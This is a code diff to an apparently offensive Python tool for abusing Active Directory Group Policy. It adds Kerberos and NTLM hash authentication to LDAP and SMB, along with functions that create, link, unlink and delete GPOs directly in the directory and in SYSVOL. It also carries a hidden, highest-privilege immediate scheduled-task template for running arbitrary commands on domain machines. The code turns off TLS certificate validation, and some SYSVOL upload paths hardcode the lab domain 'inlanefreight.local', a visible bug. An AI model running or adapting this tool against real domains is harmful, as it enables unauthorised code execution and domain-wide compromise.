@@ -11,22 +11,26 @@ import ldap3
 import uuid
 from impacket.smbconnection import SMBConnection
 from datetime import datetime
+import ssl
+from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
+from binascii import unhexlify
 
 class GPOhelper:
-    def __init__(self, username, password, domain, lmhash, nthash, dcHost, scope, context):
+    def __init__(self, username, password, domain, lmhash, nthash, dcHost, scope, context, kerberos, aesKey, options):
         self.__username = username
         self.__password = password
         self.__domain = domain
         self.__lmhash = lmhash
         self.__nthash = nthash
         self.__dcHost = dcHost
+        self.__k = kerberos
+        self.__aesKey = aesKey
+        self.__options = options
 
         self.ldapconn = ''
         self.ldaprecords = []
 
         self.smbconn = ''
-
-
 
         if scope == "gPCUserExtensionNames":
             self.gpoattr = scope
@@ -150,7 +154,6 @@ class GPOhelper:
         }
 
 
-
         self.tmpName = "/tmp/GPOwned.tmp"
 
         self.template_file_new = '<?xml version="1.0" encoding="utf-8"?><Files clsid="{215B2E53-57CE-475c-80FE-9EEC14635851}"></Files>'
@@ -168,22 +171,170 @@ class GPOhelper:
         self.template_task_new = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"></ScheduledTasks>'
         self.template_task = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="CHANGEME_TASKNAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT" removePolicy="0"><Properties action="C" name="CHANGEME_TASKNAME" runAs="CHANGEME_USER" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>CHANGEME_AUTHOR</Author><Description>CHANGEME_DESCRIPTION</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>CHANGEME_USER</UserId><LogonType>S4U</LogonType><RunLevel>HighestPrivilege</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>CHANGEME_LOCATION</Command></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>'
 
+    def ldap3_kerberos_login(self,connection, target, user, password, domain='', lmhash=None, nthash=None, aesKey='', kdcHost=None,
+                            TGT=None, TGS=None, useCache=True):
+        from pyasn1.codec.ber import encoder, decoder
+        from pyasn1.type.univ import noValue
+        """
+        logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
+        :param string user: username
+        :param string password: password for the user
+        :param string domain: domain where the account is valid for (required)
+        :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
+        :param string nthash: NTHASH used to authenticate using hashes (password is not used)
+        :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
+        :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
+        :param struct TGT: If there's a TGT available, send the structure here and it will be used
+        :param struct TGS: same for TGS. See smb3.py for the format
+        :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
+        :return: True, raises an Exception if error.
+        """
+        if lmhash != '' or nthash != '':
+            if len(lmhash) % 2:
+                lmhash = '0' + lmhash
+            if len(nthash) % 2:
+                nthash = '0' + nthash
+            try:  # just in case they were converted already
+                lmhash = unhexlify(lmhash)
+                nthash = unhexlify(nthash)
+            except TypeError:
+                pass
 
+        # Importing down here so pyasn1 is not required if kerberos is not used.
+        from impacket.krb5.ccache import CCache
+        from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
+        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+        from impacket.krb5 import constants
+        from impacket.krb5.types import Principal, KerberosTime, Ticket
+        import datetime
 
-    def conn2ldap(self):
+        if TGT is not None or TGS is not None:
+            useCache = False
+
+        target = 'ldap/%s' % target
+        if useCache:
+            domain, user, TGT, TGS = CCache.parseFile(domain, user, target)
+
+        # First of all, we need to get a TGT for the user
+        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        if TGT is None:
+            if TGS is None:
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
+                                                                        aesKey, kdcHost)
+        else:
+            tgt = TGT['KDC_REP']
+            cipher = TGT['cipher']
+            sessionKey = TGT['sessionKey']
+
+        if TGS is None:
+            serverName = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
+            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
+                                                                    sessionKey)
+        else:
+            tgs = TGS['KDC_REP']
+            cipher = TGS['cipher']
+            sessionKey = TGS['sessionKey']
+
+            # Let's build a NegTokenInit with a Kerberos REQ_AP
+
+        blob = SPNEGO_NegTokenInit()
+
+        # Kerberos
+        blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]
+
+        # Let's extract the ticket from the TGS
+        tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+        ticket = Ticket()
+        ticket.from_asn1(tgs['ticket'])
+
+        # Now let's build the AP_REQ
+        apReq = AP_REQ()
+        apReq['pvno'] = 5
+        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+
+        opts = []
+        apReq['ap-options'] = constants.encodeFlags(opts)
+        seq_set(apReq, 'ticket', ticket.to_asn1)
+
+        authenticator = Authenticator()
+        authenticator['authenticator-vno'] = 5
+        authenticator['crealm'] = domain
+        seq_set(authenticator, 'cname', userName.components_to_asn1)
+        now = datetime.datetime.utcnow()
+
+        authenticator['cusec'] = now.microsecond
+        authenticator['ctime'] = KerberosTime.to_asn1(now)
+
+        encodedAuthenticator = encoder.encode(authenticator)
+
+        # Key Usage 11
+        # AP-REQ Authenticator (includes application authenticator
+        # subkey), encrypted with the application session key
+        # (Section 5.5.1)
+        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)
+
+        apReq['authenticator'] = noValue
+        apReq['authenticator']['etype'] = cipher.enctype
+        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
+
+        blob['MechToken'] = encoder.encode(apReq)
+
+        request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
+                                                    blob.getData())
+
+        # Done with the Kerberos saga, now let's get into LDAP
+        if connection.closed:  # try to open connection if closed
+            connection.open(read_server_info=False)
+
+        connection.sasl_in_progress = True
+        response = connection.post_send_single_response(connection.send('bindRequest', request, None))
+        connection.sasl_in_progress = False
+        if response[0]['result'] != 0:
+            raise Exception(response)
+
+        connection.bound = True
+
+        return True
+
+    def conn2ldap(self,tls_version, target):
         print("[*] Connecting to LDAP service at %s" % self.__dcHost)
-        ldapserver = ldap3.Server(self.__dcHost, get_info=ldap3.ALL)
-        password = self.__password
-        if self.__nthash != '':
-            password = self.__lmhash + ":" + self.__nthash
-        self.ldapconn = ldap3.Connection(ldapserver, user='%s\\%s' % (self.__domain, self.__username), password=password, authentication=ldap3.NTLM)
-        if not self.ldapconn.bind():
-            raise
+        user = '%s\\%s' % (self.__domain, self.__username)
+        connect_to = self.__dcHost
+        if self.__dcHost is not None:
+            connect_to = self.__dcHost
+        if tls_version is not None:
+            use_ssl = True
+            port = 636
+            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
+        else:
+            use_ssl = False
+            port = 389
+            tls = None
+        ldap_server = ldap3.Server(connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
+        if self.__k:
+            self.ldapconn = ldap3.Connection(ldap_server)
+            self.ldapconn.bind()
+            if self.__nthash == None and self.__lmhash == None:
+                self.__nthash = ''
+                self.__lmhash = ''
+            self.ldap3_kerberos_login(self.ldapconn, target, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__dcHost)
+        elif self.__nthash is not None:
+            self.__lmhash = "aad3b435b51404eeaad3b435b51404ee"
+            self.ldapconn = ldap3.Connection(ldap_server, user=user, password=self.__lmhash + ":" + self.__nthash, authentication=ldap3.NTLM, auto_bind=True)
+        else:
+            self.ldapconn = ldap3.Connection(ldap_server, user=user, password=self.__password, authentication=ldap3.NTLM, auto_bind=True)
+
     def conn2smb(self):
         print("[*] Connecting to SMB service at %s" % self.__dcHost)
         try:
             smbClient = SMBConnection(self.__dcHost, self.__dcHost, sess_port=445)
-            smbClient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+            if self.__nthash == None and self.__lmhash == None:
+                self.__nthash = ''
+                self.__lmhash = ''
+            if self.__k:
+                smbClient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__dcHost)           
+            else:
+                smbClient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
             self.smbconn = smbClient
         except:
             raise
@@ -296,14 +447,153 @@ class GPOhelper:
         ret = (path, info, dn)
         return ret
 
-    def ldapQuery(self, searchFilter, attributes):
+    def ldapQuery(self, searchFilter, attributes, prefix=''):
+
         base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        if prefix:
+
+            base = prefix + base
+
         return self.ldapconn.search(base, searchFilter, attributes=attributes)
 
-    def ldapGPOInfo(self, displayname, name):
-        searchFilter = "(&(objectCategory=groupPolicyContainer)(displayName=%s)(name=%s)(%s=*))" % (displayname, name, self.gpoattr)
+    def ldapGPOFromSiteInfo(self,name):
+        target = self.get_machine_name(self.__options, self.__domain)       
+        dn_prefix = "CN=Sites,CN=Configuration,"
+        searchFilter = "(&(objectCategory=site)(name=%s))" % (name)
         if self.ldapconn == '':
-            self.conn2ldap()
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+        print("[*] Requesting GPOs SITE info from LDAP")
+        self.ldaprecords = []
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES, dn_prefix)
+        if retvalue != True:
+                raise
+        entries = self.ldapconn.entries
+        for entry in entries:
+            try:
+                tmp = {
+                    'dn' : entry.entry_dn,
+                    'Name' : entry["name"],
+                    'distinguishedName' : entry["distinguishedName"],
+                    'gPLink' : entry["gPLink"],
+                    'objectGUID' : entry["objectGUID"],
+                    'objectcategory' : entry["objectcategory"]
+                }
+            except ldap3.core.exceptions.LDAPKeyError:
+                tmp = {
+                    'dn' : entry.entry_dn,
+                    'Name' : entry["name"],
+                    'distinguishedName' : entry["distinguishedName"],
+                    'gPLink' : None,
+                    'objectGUID' : entry["objectGUID"],
+                    'objectcategory' : entry["objectcategory"]
+                }               
+            self.ldaprecords.append(tmp)
+        return self.ldaprecords
+    
+    def ldapGPOFromOUInfo(self,name):
+        target = self.get_machine_name(self.__options, self.__domain)
+        searchFilter = "(&(objectCategory=organizationalUnit)(name=%s))" % (name)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+        print("[*] Requesting GPOs OU info from LDAP")
+        self.ldaprecords = []
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
+        if retvalue != True:
+                raise
+        entries = self.ldapconn.entries
+        for entry in entries:
+            try:
+                tmp = {
+                    'dn' : entry.entry_dn,
+                    'Name' : entry["name"],
+                    'distinguishedName' : entry["distinguishedName"],
+                    'gPLink' : entry["gPLink"],
+                    'objectGUID' : entry["objectGUID"],
+                    'objectcategory' : entry["objectcategory"]
+                }
+            except ldap3.core.exceptions.LDAPKeyError:
+                tmp = {
+                    'dn' : entry.entry_dn,
+                    'Name' : entry["name"],
+                    'distinguishedName' : entry["distinguishedName"],
+                    'gPLink' : None,
+                    'objectGUID' : entry["objectGUID"],
+                    'objectcategory' : entry["objectcategory"]
+                }                
+            self.ldaprecords.append(tmp)
+        return self.ldaprecords
+    
+    def DomainToDN(self,domain):
+        parts = domain.split('.')
+        dn = ','.join([f'DC={part}' for part in parts])
+        return dn      
+
+    def ldapGPOFromDomainInfo(self,name):
+        target = self.get_machine_name(self.__options, self.__domain)
+        domain_dn = self.DomainToDN(self.__domain)
+        searchFilter = "(&(objectClass=*)(distinguishedname=%s))" % domain_dn
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+        print("[*] Requesting GPOs Domain info from LDAP")
+        self.ldaprecords = []
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
+        if retvalue != True:
+                raise
+        entries = self.ldapconn.entries
+        for entry in entries:
+            try:
+                tmp = {
+                    'dn' : entry.entry_dn,
+                    'Name' : entry["name"],
+                    'distinguishedName' : entry["distinguishedName"],
+                    'gPLink' : entry["gPLink"],
+                    'objectGUID' : entry["objectGUID"],
+                    'objectcategory' : entry["objectcategory"]
+                }
+            except ldap3.core.exceptions.LDAPKeyError:
+                tmp = {
+                    'dn' : entry.entry_dn,
+                    'Name' : entry["name"],
+                    'distinguishedName' : entry["distinguishedName"],
+                    'gPLink' : None,
+                    'objectGUID' : entry["objectGUID"],
+                    'objectcategory' : entry["objectcategory"]
+                }                
+            self.ldaprecords.append(tmp)
+        return self.ldaprecords           
+
+    def ldapGPOInfo(self, displayname, name):
+        target = self.get_machine_name(self.__options, self.__domain)
+        #searchFilter = "(&(objectCategory=groupPolicyContainer)(displayName=%s)(name=%s)(%s=*))" % (displayname, name, self.gpoattr) old query did not returned all the gpos
+        searchFilter = "(&(objectCategory=groupPolicyContainer)(displayName=%s)(name=%s))" % (displayname, name)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+
         print("[*] Requesting GPOs info from LDAP")
         self.ldaprecords = []
         retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
@@ -311,21 +601,38 @@ class GPOhelper:
                 raise
         entries = self.ldapconn.entries
         for entry in entries:
-            tmp = {
-                'dn' : entry.entry_dn,
-                'Name' : entry["name"],
-                'displayName' : entry["displayName"],
-                'gPCFileSysPath' : entry["gPCFileSysPath"],
-                self.gpoattr : entry[self.gpoattr],
-                'versionNumber' : entry["versionNumber"]
-            }
+            try:
+                tmp = {
+                    'dn' : entry.entry_dn,
+                    'Name' : entry["name"],
+                    'displayName' : entry["displayName"],
+                    'gPCFileSysPath' : entry["gPCFileSysPath"],
+                    self.gpoattr : entry[self.gpoattr],
+                    'versionNumber' : entry["versionNumber"]
+                }
+            except ldap3.core.exceptions.LDAPKeyError:
+                tmp = {
+                    'dn' : entry.entry_dn,
+                    'Name' : entry["name"],
+                    'displayName' : entry["displayName"],
+                    'gPCFileSysPath' : entry["gPCFileSysPath"],
+                    self.gpoattr : None,
+                    'versionNumber' : entry["versionNumber"]
+                }                
             self.ldaprecords.append(tmp)
         return self.ldaprecords
 
     def ldapGplinkInfo(self, ou, gpo):
+        target = self.get_machine_name(self.__options, self.__domain)
         searchFilter = "(&(gPLink=%s)(name=%s))" % (gpo, ou)
         if self.ldapconn == '':
-            self.conn2ldap()
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
         print("[*] Requesting GPOs info from LDAP")
         self.ldaprecords = []
         retvalue = self.ldapQuery(searchFilter, ['distinguishedName', 'gPLink', 'name'])
@@ -348,8 +655,15 @@ class GPOhelper:
 
     def updateVersion(self, gpo):
         searchFilter = "(&(objectCategory=groupPolicyContainer)(name=%s))" % gpo
+        target = self.get_machine_name(self.__options, self.__domain)
         if self.ldapconn == '':
-            self.conn2ldap()
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
         print("[*] Requesting %s version and location from LDAP" % gpo)
         self.ldaprecords = []
         retvalue = self.ldapQuery(searchFilter, ['versionNumber', 'gPCFileSysPath'])
@@ -518,8 +832,6 @@ class GPOhelper:
 
         self.updateGUID(info, k, ['Group Policy Folders', 'Folders'], dn)
 
-
-
     def GPORegCreate(self, hive, key, subkey, t, value, default, gpo):
         (path, info, dn) = self.extractInfo(gpo)
         xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Registry\\Registry.xml"
@@ -566,6 +878,840 @@ class GPOhelper:
 
         self.updateGUID(info, k, ['Group Policy Registry', 'Registry'], dn)
 
+
+    def CreateGPOFiles(self,domain,gpo_guid, display_name):
+
+        if self.smbconn == '':
+            self.conn2smb()
+        files = self.smbconn.listPath("SYSVOL", f"{domain}/Policies/*")
+
+        exist = False
+
+        print(f"[+] Checking if folder with guid {{{gpo_guid}}} exist")
+
+        for file in files:
+
+            if file.get_longname() == f"{{{gpo_guid}}}":
+
+                exist = True
+
+                break
+
+        if exist:
+
+            print(f"[-] The GPO with guid {{{gpo_guid}}} already exists")
+            exit(1)
+
+        print("[+] Creating necessary gpo files and folders")
+
+        try:
+
+            gpo_content = f"""[General]
+Version=0
+displayName={display_name}
+
+            """
+
+            fh = open("./GPT.INI", "w+b")
+            fh.write(gpo_content.encode('utf-8'))
+            fh.seek(0)
+
+            self.smbconn.createDirectory("SYSVOL", f"{domain}/Policies/{{{gpo_guid}}}")
+            self.smbconn.createDirectory("SYSVOL", f"{domain}/Policies/{{{gpo_guid}}}/Machine")
+            self.smbconn.createDirectory("SYSVOL", f"{domain}/Policies/{{{gpo_guid}}}/User")
+            self.smbconn.putFile("SYSVOL", f"inlanefreight.local/Policies/{{{gpo_guid}}}/GPT.INI", fh.read)
+
+            fh.close()
+            os.remove("./GPT.INI")
+
+            if self.__options.comment is not None:
+                
+                comment = self.__options.comment
+                fh = open("./GPO.cmt", "w+b")
+                fh.write(comment.encode('utf-8'))
+                fh.seek(0)
+                self.smbconn.putFile("SYSVOL", f"inlanefreight.local/Policies/{{{gpo_guid}}}/GPO.cmt", fh.read)
+
+                fh.close()
+                os.remove("./GPO.cmt")
+
+            print(f"[+] GPO created")
+            exit(0)
+
+        except Exception as e:
+
+            print(f"[-] Failed to create dir or file with exception {e}")
+            exit(1)
+
+
+    def CreateGPO(self, GPOName):
+        target = self.get_machine_name(self.__options, self.__domain)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        #get domain from DN
+        parts = base.split(',')
+        domain_parts = [part.split('=')[1] for part in parts if part.startswith('DC=')]
+        domain = '.'.join(domain_parts)
+
+        gpo_guid = str(uuid.uuid4()).upper()
+
+        #gpo_cn = 'CN=' + GPOName + ',CN=Policies,CN=System,' + base
+        gpo_cn = f"CN={{{gpo_guid}}},CN=Policies,CN=System,{base}"
+
+        attributes = {
+            'objectClass': ['top', 'groupPolicyContainer'],
+            'cn': f"{{{gpo_guid}}}",
+            'displayName': GPOName,
+            'name': f"{{{gpo_guid}}}",
+            'gPCFileSysPath': f'\\\\{domain}\\SYSVOL\\{domain}\\Policies\\{{{gpo_guid}}}',
+            'gPCFunctionalityVersion': '2',
+            'versionnumber': '0'
+        }
+
+        # Add the GPO to AD
+        self.ldapconn.add(gpo_cn, attributes=attributes)
+        if not self.ldapconn.result['description'] == 'success':
+            print(f'[-] Failed to create GPO: {self.ldapconn.result["description"]}')
+
+        else:
+            self.CreateGPOFiles(domain,gpo_guid, GPOName)
+
+    def CheckForDuplicates(self,GPOName):
+        target = self.get_machine_name(self.__options, self.__domain)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        self.ldapconn.search(
+            search_base='CN=Policies,CN=System,' + base,
+            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
+            attributes=['distinguishedName','cn']
+        )
+
+        print(f"[+] Checking if the GPO with name {GPOName} alreay exist.")
+
+        if len(self.ldapconn.entries) >= 1:
+
+            print(f'[-] A gpo with the name "{GPOName}" and guid "{self.ldapconn.entries[0].cn}" already exist.')
+            
+            return True
+
+        return False
+
+    def DeleteGPOFiles(self,domain,gpo_guid):
+
+        def delete_folder_recursive(share_name, folder_path):
+            try:
+                items = self.smbconn.listPath(share_name, folder_path+"/*")
+                for i in range(len(items)):
+                    item_name = items[i].get_longname()
+                    if item_name in [".", ".."]:
+                        continue
+                    full_path = f"{folder_path}/{item_name}"
+                    if items[i].is_directory() > 0:
+                        delete_folder_recursive(share_name, full_path)
+                        self.smbconn.deleteDirectory(share_name, full_path)
+                    else:
+                        self.smbconn.deleteFile(share_name, full_path)
+            except Exception as e:
+                print(f"[-] Could not remove dir {folder_path} with error {e}")
+
+        if self.smbconn == '':
+            self.conn2smb()
+        files = self.smbconn.listPath("SYSVOL", f"{domain}/Policies/*")
+
+        exist = False
+
+        print(f"[+] Checking if folder with guid {gpo_guid} exist")
+
+        for file in files:
+
+            if file.get_longname() == f"{gpo_guid}":
+
+                exist = True
+
+                break
+
+        if exist:
+            
+            try:
+
+                print(f"[+] The GPO with guid {gpo_guid} found, proceding to remove")   
+                items = self.smbconn.listPath("SYSVOL", f"{domain}/Policies/{gpo_guid}/*")
+                for i in range(len(items)):
+                    item_name = items[i].get_longname()
+                    if item_name in [".", ".."]:
+                        continue
+                    full_path = f"{domain}/Policies/{gpo_guid}/{item_name}"
+                    if items[i].is_directory() > 0:
+                        delete_folder_recursive("SYSVOL", full_path)
+                        self.smbconn.deleteDirectory("SYSVOL", full_path)
+                    else:
+                        self.smbconn.deleteFile("SYSVOL", full_path)
+
+                self.smbconn.deleteDirectory("SYSVOL", f"{domain}/Policies/{gpo_guid}")
+
+                print(f"[+] The GPO with guid {gpo_guid} got removed from the domain")
+                exit(0)
+
+            except Exception as e:
+
+                print(f"[-] Could not remove dir {gpo_guid} with error {e}")
+                exit(1)
+
+        print(f"GPO with the guid {gpo_guid} was not found in the SYSVOL folder")
+        exit(1)
+
+
+    def DeleteGPO(self, GPOName):
+        target = self.get_machine_name(self.__options, self.__domain)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        #get domain from DN
+        parts = base.split(',')
+        domain_parts = [part.split('=')[1] for part in parts if part.startswith('DC=')]
+        domain = '.'.join(domain_parts)
+
+        self.ldapconn.search(
+            search_base='CN=Policies,CN=System,' + base,
+            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
+            attributes=['distinguishedName','cn']
+        )
+        if len(self.ldapconn.entries) == 1:
+
+            gpo_guid = str(self.ldapconn.entries[0].cn)
+
+            gpo_dn = str(self.ldapconn.entries[0].distinguishedName)
+
+            print(f"[+] GPO {GPOName} found proceding to remove")
+
+            if self.ldapconn.delete(gpo_dn):
+                self.DeleteGPOFiles(domain,gpo_guid)
+            else:
+                print(f'[-] Failed to delete GPO "{GPOName}": {self.ldapconn.result["description"]}')
+                exit(1)
+
+        else:            
+            print(f"[-] GPO {GPOName} was not found in the domain...")
+            exit(1)
+
+    def RemoveLinkOU(self, OUName, GPOName):
+        target = self.get_machine_name(self.__options, self.__domain)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+        
+        #getting the gpo hex
+
+        print(f"[+] Checking if GPO {GPOName} exists")
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        self.ldapconn.search(
+            search_base='CN=Policies,CN=System,' + base,
+            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
+            attributes=['distinguishedName','cn']
+        )
+
+        if len(self.ldapconn.entries) == 0:
+
+            print("[-] GPO not found in the domain")
+            exit(1)
+        
+        gpo_hex = str(self.ldapconn.entries[0].cn)
+
+        print(f"[+] GPO with hex {gpo_hex} found")
+
+        #getting info from the OU
+        searchFilter = "(&(objectCategory=organizationalUnit)(name=%s))" % (OUName)
+
+        self.ldaprecords = []     
+
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
+
+        if retvalue != True:
+                raise
+
+        entries = self.ldapconn.entries
+
+        if len(entries) == 0:
+
+            print("[-] OU not found")
+            exit(1)
+
+        for entry in entries:
+            
+            try:
+
+                self.ldaprecords.append(entry["gPLink"])
+
+            except ldap3.core.exceptions.LDAPKeyError:
+
+                self.ldaprecords.append(' ')
+
+            self.ldaprecords.append(entry["distinguishedname"])
+
+        if self.ldaprecords[0] == ' ':
+
+            print("[-] Attribute gPlink is empty, no link exist in this OU")
+
+            sys.exit(1)
+
+
+        old_gPLink = str(self.ldaprecords[0])
+
+        new_gPLink = ''
+
+        found = False
+
+        for link in old_gPLink.split("["):
+
+            if str(gpo_hex) in str(link):
+                
+                found = True
+                continue
+
+            new_gPLink += f"[{link}"
+
+        if found is not True:
+
+            print(f"[-] The GPO guid was not found in this gPLink")
+            sys.exit(1)
+
+        new_gPLink = new_gPLink[1::]
+
+        OUDn =self.ldaprecords[1]
+
+        print(f"[+] OU dn is {OUDn}")
+        print(f"[+] OU old gPLink is {self.ldaprecords[0]}")
+        print(f"[+] New gPLink is {new_gPLink}")
+
+        if new_gPLink == '':
+
+            self.ldapconn.modify(str(OUDn), {'gplink': [(ldap3.MODIFY_REPLACE, [])]})
+
+        else:
+
+            self.ldapconn.modify(str(OUDn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})
+
+        if not self.ldapconn.result['description'] == 'success':
+            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
+            sys.exit()
+        
+        print("[+] Removed old gpo link")
+        sys.exit()        
+
+    def LinkGPOTOOU(self,OUName,GPOName):
+
+        target = self.get_machine_name(self.__options, self.__domain)
+        if self.ldapconn == '':
+            if self.__options.use_ldaps is True:
+                try:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
+                except ldap3.core.exceptions.LDAPSocketOpenError:
+                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
+            else:
+                self.conn2ldap(None, target)
+        
+        #getting the gpo hex
+
+        print(f"[+] Checking if GPO {GPOName} exists")
+
+        base = self.ldapconn.server.info.other['defaultNamingContext'][0]
+
+        self.ldapconn.search(
+            search_base='CN=Policies,CN=System,' + base,
+            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
+            attributes=['distinguishedName','cn']
+        )
+
+        if len(self.ldapconn.entries) == 0:
+
+            print("[-] GPO not found in the domain")
+            exit(1)
+        
+        gpo_hex = str(self.ldapconn.entries[0].cn)
+
+        print(f"[+] GPO with hex {gpo_hex} found")
+
+        #getting info from the OU
+        searchFilter = "(&(objectCategory=organizationalUnit)(name=%s))" % (OUName)
+
+        self.ldaprecords = []     
+
+        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
+
+        if retvalue != True:
+                raise
+
+        entries = self.ldapconn.entries
+
+        if len(entries) == 0:
+
+            print("[-] OU not found")
+            exit(1)
+
+        for entry in entries:
+            
+            try:
+
+                self.ldaprecords.append(entry["gPLink"])
+
+            except ldap3.core.exceptions.LDAPKeyError:
+
+                self.ldaprecords.append(' ')
+
